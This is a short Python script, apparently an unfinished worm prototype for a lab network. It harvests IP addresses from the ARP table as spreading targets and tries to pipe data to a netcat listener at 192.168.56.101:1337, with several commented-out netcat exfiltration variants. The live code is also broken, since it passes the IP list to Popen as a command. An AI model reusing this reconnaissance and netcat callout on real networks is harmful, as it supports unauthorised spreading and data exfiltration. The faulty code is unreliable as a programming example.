#!/usr/bin/env python

import subprocess
import re
import os

def worm_spread():

    target_ips=[]
 
    arp_list = subprocess.check_output(["arp", "-a"])

    pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'   
    
    ips = re.findall(pattern, arp_list)

    unwanted_ips = ["192.168.56.1", "192.168.56.100", "192.168.56.101"]

    for i in ips:
        if i not in unwanted_ips:
            target_ips.append(i)
    return target_ips

print(worm_spread())


def nc_listener():

    #subprocess.call(["nc", "192.168.56.101", "1337"])

    args=worm_spread()

    child_process=subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    child_process_output=child_process.communicate(["nc","192.168.56.101","1337"])
    print(child_process_output)

    #read, write = os.pipe()
    #os.write(write, "worm_spread()")
    #os.close(write)

    #subprocess.check_call(["nc","192.168.56.101","1337"])

    #p=Popen([xxxxxxxxxxx],stdout=subprocess.PIPE,stdin=subprocess.PIPE)
    #p.stdin.write(worm_spread())
    #p.communicate()[0]

    #p1 = subprocess.call("nc '192.168.56.101' '1337' < worm_spread()", capture_output=True, text=True, shell=True)
    #print(p1.stdout)

    #subprocess.call('worm_spread() | nc 192.168.56.101 1337', capture_output=True, text=True, shell=True)
    #print(p1.stdout)

    #subprocess.call(["nc","192.168.56.101", "1337"], stdin = worm_spread(), stdout=None, stderr=None, shell=False)

print(nc_listener())
